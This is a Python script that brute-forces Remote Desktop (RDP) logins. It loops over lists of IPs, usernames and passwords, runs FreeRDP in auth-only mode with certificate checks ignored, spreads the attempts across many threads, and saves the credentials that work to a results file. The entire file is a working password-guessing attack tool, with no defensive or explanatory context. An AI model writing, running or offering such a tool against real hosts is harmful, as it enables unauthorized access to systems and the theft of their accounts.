# -*- coding: utf-8 -*-

from threading import Thread
from platform import system as sys_ver
from time import sleep
from subprocess import run, PIPE, STDOUT

# Counters
good = 0
counter = 0
completed = 0

# OS Detect
if sys_ver() == 'Windows':
    fr_name = 'wfreerdp.exe'
else:
    fr_name = 'xfreerdp'

def RDP_Check(ip, user, passw):
    global good, counter, completed

    completed += 1
    print('Good: {}; Completed: {}/{}'.format(good, completed, len(ips)*len(users)*len(passwords)), end="\r")
    
    try:
        r_agr = [fr_name, f'/v:{ip}', f'/port:{port}', f'/u:{user}', f'/p:{passw}', '/cert-ignore', '+auth-only', '+compression', '/sec:nla']
        run(r_agr, shell=False, stdout=PIPE, stderr=STDOUT, check=True)

        good += 1
        open('rez/good.txt', 'a', encoding="utf-8").write('{};{}:{}\n'.format(ip, user, passw))

        del ips[ips.index(ip)]
    except:
        pass
    
    counter -= 1

def limit():
    ''' Checking active threads. Very stupid, but no other variants. '''
    while counter >= threads:
        if counter == 0:
            break

        sleep(0.4)

if __name__ == '__main__':
    ''' Ask user for threads and port '''
    threads = int(input('Threads: '))
    port = int(input('Port: ') or 3389)

    ''' Read IP`s, user and passwords '''
    with open('data/ip.txt', "r", encoding="utf-8") as ip_data:
        ips = ip_data.read().splitlines()

    with open('data/users.txt', "r", encoding="utf-8") as user_data:
        users = user_data.read().splitlines()

    with open('data/passwords.txt', "r", encoding="utf-8") as password_data:
        passwords = password_data.read().splitlines()

    print('\n')

    ''' user + password to IP '''
    for user in users:
        for passw in passwords:
            for ip in ips:
                ''' Check threads. Stupid, but works '''
                limit()

                ''' Run new thread '''
                Thread(target=RDP_Check, args=(ip, user, passw,), daemon=True).start()

                ''' Counter - up '''
                counter += 1

    ''' Waiting for complete '''
    while counter != 0:
        sleep(5)

    print('Work - done. Shutdown...')
